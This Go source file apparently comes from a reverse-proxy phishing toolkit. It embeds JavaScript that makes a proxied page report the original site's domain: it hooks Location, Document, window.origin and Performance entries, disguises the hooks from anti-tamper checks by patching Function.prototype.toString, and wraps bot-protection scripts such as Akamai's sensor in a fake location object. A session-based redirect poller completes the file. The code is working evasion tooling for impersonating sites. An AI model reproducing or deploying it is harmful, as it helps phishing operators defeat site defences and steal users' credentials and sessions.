package core

// LOCATION_SPOOF_JS overrides Location.prototype getters, Document.prototype
// properties, and window.origin to return original domains instead of proxy domains.
// Also patches Function.prototype.toString so overridden getters pass anti-tamper
// checks that verify functions return "[native code]".
//
// The {domain_map} placeholder is replaced at runtime with proxy→original mappings.
const LOCATION_SPOOF_JS = `(function(){
var m={domain_map};
var _ov=new WeakSet();
var _fts=Function.prototype.toString;
var _bfts=Function.prototype.bind.toString||_fts;
Function.prototype.toString=function(){if(_ov.has(this))return'function '+((this._n)||this.name||'')+' () { [native code] }';return _fts.call(this)};
_ov.add(Function.prototype.toString);
function rp(v){if(typeof v!=='string')return v;for(var k in m){while(v.indexOf(k)!==-1)v=v.replace(k,m[k])}return v}
['hostname','host','href','origin'].forEach(function(p){try{var d=Object.getOwnPropertyDescriptor(Location.prototype,p);if(d&&d.get){var og=d.get;var ng=function(){return rp(og.call(this))};ng._n='get '+p;_ov.add(ng);var nd={get:ng,enumerable:true,configurable:true};if(d.set)nd.set=d.set;Object.defineProperty(Location.prototype,p,nd)}}catch(e){}});
try{var lts=Location.prototype.toString;var nts=function(){return rp(lts.call(this))};nts._n='toString';_ov.add(nts);Location.prototype.toString=nts}catch(e){}
var dp=Document.prototype;
['URL','referrer','baseURI'].forEach(function(p){try{var d=Object.getOwnPropertyDescriptor(dp,p);if(d&&d.get){var og=d.get;var ng=function(){return rp(og.call(this))};ng._n='get '+p;_ov.add(ng);var nd={get:ng,enumerable:true,configurable:true};if(d.set)nd.set=d.set;Object.defineProperty(dp,p,nd)}}catch(e){}});
try{var dd=Object.getOwnPropertyDescriptor(dp,'domain');if(dd&&dd.get){var odg=dd.get;var ndg=function(){return rp(odg.call(this))};ndg._n='get domain';_ov.add(ndg);Object.defineProperty(dp,'domain',{get:ndg,set:dd.set,configurable:true,enumerable:true})}}catch(e){}
try{var wod=Object.getOwnPropertyDescriptor(window,'origin');if(wod){if(wod.get){var wog=wod.get;var nwog=function(){return rp(wog.call(this))};nwog._n='get origin';_ov.add(nwog);Object.defineProperty(window,'origin',{get:nwog,configurable:true,enumerable:true})}else if(typeof wod.value==='string'){var swog=function(){return rp(location.origin)};swog._n='get origin';_ov.add(swog);Object.defineProperty(window,'origin',{get:swog,configurable:true,enumerable:true})}}}catch(e){}
function rpObj(o){if(!o||typeof o!=='object')return o;var c={};for(var k in o){try{var v=o[k];c[k]=(typeof v==='string')?rp(v):v}catch(e){c[k]=o[k]}}Object.setPrototypeOf(c,Object.getPrototypeOf(o));return c}
function rpArr(a){if(!a||!Array.isArray(a))return a;return a.map(function(e){return rpObj(e)})}
try{var _gE=Performance.prototype.getEntries;var ngE=function(){return rpArr(_gE.call(this))};ngE._n='getEntries';_ov.add(ngE);Performance.prototype.getEntries=ngE}catch(e){}
try{var _gEBT=Performance.prototype.getEntriesByType;var ngEBT=function(t){return rpArr(_gEBT.call(this,t))};ngEBT._n='getEntriesByType';_ov.add(ngEBT);Performance.prototype.getEntriesByType=ngEBT}catch(e){}
try{var _gEBN=Performance.prototype.getEntriesByName;var ngEBN=function(n,t){return rpArr(_gEBN.call(this,rp(n),t))};ngEBN._n='getEntriesByName';_ov.add(ngEBN);Performance.prototype.getEntriesByName=ngEBN}catch(e){}
})();`

// SENSOR_WRAP_PREFIX is prepended to bot protection JavaScript files (e.g., Akamai sensor)
// to shadow the bare `location` variable with a fake one that returns original domains.
// Only shadows bare `location` — `window.location` and `document.location` still use the real
// Location object, but those are handled by the XHR/fetch POST body interception in the HTML head script.
// The {domain_map} placeholder is replaced at runtime.
const SENSOR_WRAP_PREFIX = `(function(){
var _rl=window.location;var _dm={domain_map};
function _rp(v){if(typeof v!=='string')return v;for(var k in _dm)while(v.indexOf(k)>-1)v=v.replace(k,_dm[k]);return v}
var location=(function(){var L={};
['protocol','pathname','search','hash','port'].forEach(function(p){Object.defineProperty(L,p,{get:function(){return _rl[p]},enumerable:true})});
['hostname','host','href','origin'].forEach(function(p){Object.defineProperty(L,p,{get:function(){return _rp(_rl[p])},enumerable:true})});
L.assign=function(u){_rl.assign(u)};L.replace=function(u){_rl.replace(u)};L.reload=function(f){_rl.reload(f)};
L.toString=function(){return L.href};L.valueOf=function(){return L.href};return L})();
`

// SENSOR_WRAP_SUFFIX closes the sensor wrap IIFE.
const SENSOR_WRAP_SUFFIX = `
})();`

const DYNAMIC_REDIRECT_JS = `
function getRedirect(sid) {
	var url = "/s/" + sid;
	console.log("fetching: " + url);
	fetch(url, {
		method: "GET",
		headers: {
			"Content-Type": "application/json"
		},
		credentials: "include"
	})
		.then((response) => {

			if (response.status == 200) {
				return response.json();
			} else if (response.status == 408) {
				console.log("timed out");
				getRedirect(sid);
			} else {
				throw "http error: " + response.status;
			}
		})
		.then((data) => {
			if (data !== undefined) {
				console.log("api: success:", data);
				top.location.href=data.redirect_url;
			}
		})
		.catch((error) => {
			console.error("api: error:", error);
			setTimeout(function () { getRedirect(sid) }, 10000);
		});
}
getRedirect('{session_id}');
`
